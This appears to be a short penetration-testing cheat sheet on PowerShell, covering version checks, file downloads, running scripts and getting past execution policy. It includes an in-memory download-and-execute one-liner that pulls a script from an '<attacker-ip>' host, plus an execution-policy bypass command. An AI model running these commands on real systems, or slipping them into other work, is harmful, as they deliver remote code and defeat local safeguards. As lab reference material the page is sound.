##########
PowerShell
##########

Check Version
=============

If the following command doesn't work, assume it's powershell 1.0.

.. code-block:: none

    powershell -Command "$PSVersionTable.PSVersion"

Downloading Files
=================

In PowerShell 2.x:

.. code-block:: none

    powershell -Command '$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile("http://10.0.0.1/path/to/file","C:\path\to\file")'

In PowerShell 3 and above:

.. code-block:: none

    powershell -Command 'Invoke-WebRequest -Uri "http://10.0.0.1/path/to/file" -OutFile "C:\path\to\file"'

Running a Powershell Script From Command Line
=============================================

.. code-block:: none

    powershell IEX(New-Object Net.Webclient).downloadstring('http://<attacker-ip>:<attacker-port>/script.ps1')

.. code-block:: none

    powershell -noexit -file "C:\path\to\script.ps1"

To bypass execution policy:

.. code-block:: none

    powershell -executionPolicy bypass -noexit -file "C:\path\to\script.ps1"
